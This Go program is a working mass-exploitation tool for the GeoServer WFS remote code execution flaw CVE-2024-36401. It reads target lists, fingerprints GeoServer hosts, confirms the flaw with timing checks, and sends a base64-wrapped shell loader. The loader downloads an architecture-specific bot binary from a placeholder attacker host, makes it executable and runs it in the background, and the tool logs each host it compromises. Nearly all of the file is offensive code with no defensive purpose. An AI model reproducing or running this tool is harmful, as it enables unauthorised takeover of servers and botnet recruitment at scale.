// GeoServer WFS RCE scanner (CVE-2024-36401) — Go port of x86.py
// Feeds URLs/IPs on stdin, confirms RCE via time-based blind check, then
// drops the apex4.0 bot (x86 / x86_64 payload from IP:9111).
//
// Usage:
// Change IP to urs
//
//	scanner -p 8080 -q | ./geoserver
//	cat targets.txt | ./geoserver
package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	// apex4.0 loader cmd — arch-detected bot payload (all arches via domain)
	infectCmd = "cd /tmp||cd /dev/shm||cd /var/tmp||cd /var/run||cd /; M=$(uname -m); case $M in x86_64|amd64)A=x86_64;;i386|i486|i586|i686)A=x86;;armv7*)A=armv7l;;armv6*)A=armv6l;;armv5*)A=armv5l;;armv4*)A=armv4l;;mips)A=mips;;mipsel)A=mipsel;;m68k)A=m68k;;ppc*|powerpc)A=powerpc;;sh4|sh)A=sh4;;sparc)A=sparc;;arc)A=arc;;*)A=x86_64;;esac; U=http://IP/$A; rm -f q q.tmp; (wget -q -O q.tmp $U||wget -O q.tmp $U||busybox wget -q -O q.tmp $U||busybox wget -O q.tmp $U||curl -skLo q.tmp $U); [ -s q.tmp ]&&mv q.tmp q&&chmod 777 q&&(nohup ./q vps >/dev/null 2>&1 &)"

	// WFS base paths where GeoServer commonly lives
	basePaths = "/wfs"
	// default feature types to try if ListStoredQueries yields nothing
	fallbackTypes = "topp:states,sf:archsites,tiger:poi,ne:states,nurc:points,opengeo:countries"
)

var (
	total, candidates, gsFound, exploited, failed int64
	debug                                         bool
	sleepSec                                      = 4.0
	out                                           *os.File
)

func newClient(timeout time.Duration) *http.Client {
	tr := &http.Transport{
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:      200,
		DisableKeepAlives: true,
	}
	return &http.Client{Transport: tr, Timeout: timeout}
}

// wrapShell returns a GeoServer valueReference payload string that runs shellCmd
// through `sh -c` (base64 to survive quoting / IFU filters).
func wrapShell(shellCmd string) string {
	cmdB64 := base64.StdEncoding.EncodeToString([]byte(shellCmd))
	return fmt.Sprintf("exec(java.lang.Runtime.getRuntime(),\"sh -c echo${IFS}%s|base64${IFS}-d|sh\")", cmdB64)
}

// buildGetPropertyValue builds the vulnerable WFS request body.
func buildGetPropertyValue(featureType, valueRef string) string {
	return fmt.Sprintf(`<wfs:GetPropertyValue service='WFS' version='2.0.0'
xmlns:topp='http://www.openplans.org/topp'
xmlns:fes='http://www.opengis.net/fes/2.0'
xmlns:wfs='http://www.opengis.net/wfs/2.0'>
<wfs:Query typeNames='%s'/>
<wfs:valueReference>%s</wfs:valueReference>
</wfs:GetPropertyValue>`, featureType, valueRef)
}

// fetchFeatureTypes: ListStoredQueries -> ReturnFeatureType values
func fetchFeatureTypes(c *http.Client, base string) []string {
	u := base + "/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0"
	req, err := http.NewRequest("GET", u, nil)
	if err != nil || req == nil {
		return nil
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 Chrome/124.0")
	resp, err := c.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	s := string(body)

	var types []string
	start := 0
	for {
		i := strings.Index(s[start:], "ReturnFeatureType")
		if i < 0 {
			break
		}
		p := start + i
		gt := strings.Index(s[p:], ">")
		if gt < 0 {
			break
		}
		lt := strings.Index(s[p+gt:], "<")
		if lt < 0 {
			break
		}
		val := strings.TrimSpace(s[p+gt+1 : p+gt+lt])
		if val != "" {
			types = append(types, val)
		}
		start = p + gt + lt + 1
	}
	return types
}

// isGeoServer: strict fingerprint (WFS schema / GeoServer markers), not just
// a substring of "geoserver" which appears in generic 404 pages.
func isGeoServer(c *http.Client, base string) bool {
	paths := []string{
		"/geoserver/wfs?request=GetCapabilities&service=wfs",
		"/wfs?request=GetCapabilities&service=wfs",
	}
	for _, p := range paths {
		req, err := http.NewRequest("GET", base+p, nil)
		if err != nil || req == nil {
			continue
		}
		req.Header.Set("User-Agent", "Mozilla/5.0 Chrome/124.0")
		resp, err := c.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
		resp.Body.Close()
		low := strings.ToLower(string(body))
		// real WFS capabilities contain these namespaces/roots.
		if strings.Contains(low, "wfs_capabilities") ||
			strings.Contains(low, "getcapabilities") && strings.Contains(low, "wfs:wfs") ||
			strings.Contains(low, "geoserver") && strings.Contains(low, "wfs") {
			return true
		}
	}
	// /geoserver/web/ login page must actually be a GeoServer page
	req, err := http.NewRequest("GET", base+"/geoserver/web/", nil)
	if err == nil && req != nil {
		req.Header.Set("User-Agent", "Mozilla/5.0 Chrome/124.0")
		if resp, err := c.Do(req); err == nil {
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
			resp.Body.Close()
			low := strings.ToLower(string(body))
			if strings.Contains(low, "geoserver") && (strings.Contains(low, "geotools") || strings.Contains(low, "org.geoserver")) {
				return true
			}
		}
	}
	return false
}

// sendExploit sends the RCE payload and returns (statusCode, body, elapsed).
func sendExploit(c *http.Client, wfsURL, featureType, shellCmd string) (int, string, time.Duration) {
	payload := buildGetPropertyValue(featureType, wrapShell(shellCmd))
	req, err := http.NewRequest("POST", wfsURL, strings.NewReader(payload))
	if err != nil || req == nil {
		return 0, "", 0
	}
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("User-Agent", "Mozilla/5.0 Chrome/124.0")
	req.Header.Set("Connection", "close")
	t0 := time.Now()
	resp, err := c.Do(req)
	elapsed := time.Since(t0)
	if err != nil {
		return 0, "", elapsed
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	return resp.StatusCode, string(body), elapsed
}

// tryTarget: strict fingerprint -> differential blind-RCE -> infect.
func tryTarget(u string, c *http.Client) bool {
	// require GeoServer fingerprint first (reduces wasted work)
	if !isGeoServer(c, u) {
		return false
	}
	atomic.AddInt64(&gsFound, 1)

	types := fetchFeatureTypes(c, u)
	if len(types) == 0 {
		types = strings.Split(fallbackTypes, ",")
	}

	wfsURL := u + basePaths

	for _, t := range types {
		if t == "" {
			continue
		}
		// Phase 0: baseline latency with a no-op payload (same request shape)
		_, _, base1 := sendExploit(c, wfsURL, t, "id")
		_, _, base2 := sendExploit(c, wfsURL, t, "id")
		baseline := base1
		if base2 < baseline {
			baseline = base2
		}
		if baseline > 8*time.Second {
			// server is too slow/saturated to trust timing — skip
			continue
		}

		// Phase 1: differential blind RCE — payload must add ~sleepSec over baseline
		_, _, el := sendExploit(c, wfsURL, t, fmt.Sprintf("sleep %g", sleepSec))
		delta := el - baseline
		if delta >= time.Duration(sleepSec*0.9*float64(time.Second)) {
			// re-confirm once to defeat transient network stalls
			_, _, el2 := sendExploit(c, wfsURL, t, fmt.Sprintf("sleep %g", sleepSec))
			if el2-baseline >= time.Duration(sleepSec*0.9*float64(time.Second)) {
				sendExploit(c, wfsURL, t, infectCmd)
				atomic.AddInt64(&exploited, 1)
				fmt.Printf("[+] EXPLOITED %s (type=%s delta=%.2fs)\n", u, t, delta.Seconds())
				if out != nil {
					fmt.Fprintf(out, "%s\n", u)
				}
				return true
			}
		}
	}
	return false
}

func processTarget(base string, c *http.Client) {
	atomic.AddInt64(&total, 1)
	raw := base
	raw = strings.TrimPrefix(raw, "http://")
	raw = strings.TrimPrefix(raw, "https://")
	raw = strings.TrimSuffix(raw, "/")
	host := raw
	if i := strings.Index(host, "/"); i >= 0 {
		host = host[:i]
	}
	var urls []string
	if strings.Contains(host, ":") {
		urls = append(urls, "http://"+host)
	} else {
		for _, p := range []string{"8080", "80", "8081", "8000"} {
			urls = append(urls, "http://"+host+":"+p)
		}
	}
	for _, u := range urls {
		if tryTarget(u, c) {
			return
		}
	}
	atomic.AddInt64(&failed, 1)
	if debug {
		fmt.Printf("[-] %s not vulnerable\n", base)
	}
}

func main() {
	workers := flag.Int("w", 200, "workers")
	timeout := flag.Duration("t", 12*time.Second, "http timeout")
	flag.BoolVar(&debug, "debug", false, "verbose")
	flag.Float64Var(&sleepSec, "sleep", 4.0, "blind-RCE sleep seconds")
	outFile := flag.String("o", "geo_vuln.txt", "output")
	flag.Parse()

	c := newClient(*timeout)
	sc := bufio.NewScanner(os.Stdin)
	sc.Buffer(make([]byte, 1<<20), 1<<20)
	sem := make(chan struct{}, *workers)
	var wg sync.WaitGroup
	out, _ = os.OpenFile(*outFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer func() {
		if out != nil {
			out.Close()
		}
	}()

	// periodic stats to stderr
	go func() {
		for range time.Tick(30 * time.Second) {
			fmt.Fprintf(os.Stderr, "[stats] total=%d candidates=%d geoserver=%d exploited=%d failed=%d\n",
				atomic.LoadInt64(&total), atomic.LoadInt64(&candidates),
				atomic.LoadInt64(&gsFound), atomic.LoadInt64(&exploited), atomic.LoadInt64(&failed))
		}
	}()

	for sc.Scan() {
		u := strings.TrimSpace(sc.Text())
		if u == "" {
			continue
		}
		atomic.AddInt64(&candidates, 1)
		wg.Add(1)
		sem <- struct{}{}
		go func(x string) {
			defer wg.Done()
			defer func() { <-sem }()
			defer func() { recover() }()
			processTarget(x, c)
		}(u)
	}
	wg.Wait()
	fmt.Fprintf(os.Stderr, "total=%d candidates=%d geoserver=%d exploited=%d failed=%d\n",
		atomic.LoadInt64(&total), atomic.LoadInt64(&candidates), atomic.LoadInt64(&gsFound),
		atomic.LoadInt64(&exploited), atomic.LoadInt64(&failed))
}
